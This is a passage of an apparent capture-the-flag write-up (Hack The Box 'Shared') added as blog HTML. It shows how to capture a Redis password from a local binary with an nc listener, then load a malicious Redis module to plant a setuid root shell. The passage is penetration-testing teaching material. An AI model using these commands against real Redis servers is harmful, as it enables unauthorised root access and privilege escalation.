+</h3>
+<p>Let’s gather some basic info on the file and see what’s going on behind the scenes.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># dan_smith@shared.htb (SSH)</span>
+</span></span><span class="line"><span class="cl">file /usr/local/bin/redis_connector_dev<span class="p">|</span>tr <span class="s1">&#39;,&#39;</span> <span class="s1">&#39;\n&#39;</span>
+</span></span></code></pre></div><p>Based on the output of the file command, we can note a few things about the file:</p>
+<ul>
+<li>It is an ELF x86-64 executable</li>
+<li>it was built with a Go compiler (hence the Go BuildID)</li>
+<li>It is not stripped</li>
+</ul>
+<p>Since the Redis RESP protocol operates in plaintext, we might be able to capture the password. First, let’s copy the file to the attacker machine.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># mhil4ne@kali</span>
+</span></span><span class="line"><span class="cl">scp -i dan_smith_id_rsa <span class="s2">&#34;dan_smith@</span><span class="nv">$rhost</span><span class="s2">:/usr/local/bin/redis_connector_dev&#34;</span> .
+</span></span><span class="line"><span class="cl">chmod +x redis_connector_dev
+</span></span></code></pre></div><p>Running the file on the attacker machine, we get an error complaining that TCP port 6379 is closed on the loopback address. We can open that port by running nc in a separate tab.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># mhil4ne@kali</span>
+</span></span><span class="line"><span class="cl">nc -lv 127.0.0.1 <span class="m">6379</span>
+</span></span></code></pre></div><p>Now if we run ./redis_connector_dev{:.filepath} we get some output to the listener.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Connection received on localhost <span class="m">35468</span>
+</span></span><span class="line"><span class="cl">*2
+</span></span><span class="line"><span class="cl"><span class="nv">$4</span>
+</span></span><span class="line"><span class="cl">auth
+</span></span><span class="line"><span class="cl"><span class="nv">$16</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>REDACTED<span class="o">]</span>
+</span></span></code></pre></div><p>The strings auth and [REDACTED] are passed. Given the circumstances, the second string seems like it may be the password so let’s try using that with the redis-cli command back on the target machine.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># dan_smith@shared.htb (SSH)</span>
+</span></span><span class="line"><span class="cl">redis-cli -a <span class="s2">&#34;</span><span class="nv">$password</span><span class="s2">&#34;</span> INFO server
+</span></span></code></pre></div><p>The INFO server command is successfully executed. While running some extra enumeration commands we find out that the redis store is pretty much empty.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># dan_smith@shared.htb (SSH)</span>
+</span></span><span class="line"><span class="cl">redis-cli -a <span class="s2">&#34;</span><span class="nv">$password</span><span class="s2">&#34;</span> INFO keyspace
+</span></span></code></pre></div><p>After some research on redis, we come across this page which presents different methods of achieving RCE on a redis server. This is useful for us because the user running the redis server is root meaning we will execute commands as root if RCE is possible.</p>
+<p>One method is to load a special shared object file using MODULE LOAD query. We can build the shared object from this source code on the attacker machine, then copy module.so{:.filepath} to the target.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># james_mason@shared.htb (SSH)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">command</span><span class="o">=</span><span class="s2">&#34;cp /bin/sh /root_sh;chmod a+xs /root_sh&#34;</span>
+</span></span><span class="line"><span class="cl">redis-cli -a <span class="s2">&#34;</span><span class="nv">$password</span><span class="s2">&#34;</span> MODULE LOAD ~/module.so <span class="o">&amp;&amp;</span>
+</span></span><span class="line"><span class="cl">	redis-cli -a <span class="s2">&#34;</span><span class="nv">$password</span><span class="s2">&#34;</span> system.exec <span class="s2">&#34;</span><span class="nv">$command</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">/root_sh -p
+</span></span></code></pre></div><p>Running this should land us a shell as root where the last flag can be found at /root/root.txt{:.filepath}</p>
+
+        </div>
+        
+        
+
+        
+        
+
+          
+      </div>
+     
+      
+      
+        
+        
+          
+          
+        
+      <script>
+        var oid = "views_writeups\/8.-shared\/index.md"
+        var oid_likes = "likes_writeups\/8.-shared\/index.md"
+      </script>
+      
+      
+      
+      <script type="text/javascript" src="/js/page.min.0860cf4e04fa2d72cc33ddba263083464d48f67de06114529043cb4623319efed4f484fd7f1730df5abea0e2da6f3538855634081d02f2d6e920b956f063e823.js" integrity="sha512-CGDPTgT6LXLMM926JjCDRk1I9n3gYRRSkEPLRiMxnv7U9IT9fxcw31q&#43;oOLabzU4hVY0CB0C8tbpILlW8GPoIw=="></script>
+  
+    </section>
+  <footer class="pt-8 max-w-prose print:hidden">
+
+    
+
+    
+  </footer>
+</article>
+
+      <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
+  <a href="#the-top"
+    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top" title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+    </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+  
+  <div class="flex items-center justify-between">
+
+    
+    
+    <p class="text-sm text-neutral-500 dark:text-neutral-400">
+      © 2023 Mil4ne. All Rights Reserved.
+    </p>
+    
+
+    
+    
+
+  </div>
+  <script>
+    
+    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+      margin: 24,
+      background: 'rgba(0,0,0,0.5)',
+      scrollOffset: 0,
+    })
+    
+  </script>
+  
+  
+  <script type="text/javascript" src="/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js" integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh&#43;sCQ0E53ghYrxgYqw&#43;0GCRyIEpA=="></script>
+  
+  
+</footer><div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
+  data-url="https://your_domain.com/"
+  style="z-index:500"
+>
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"
+  >
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0"
+        />
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)"
+      >
+        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+  </div>
+</body>
+
+</html>
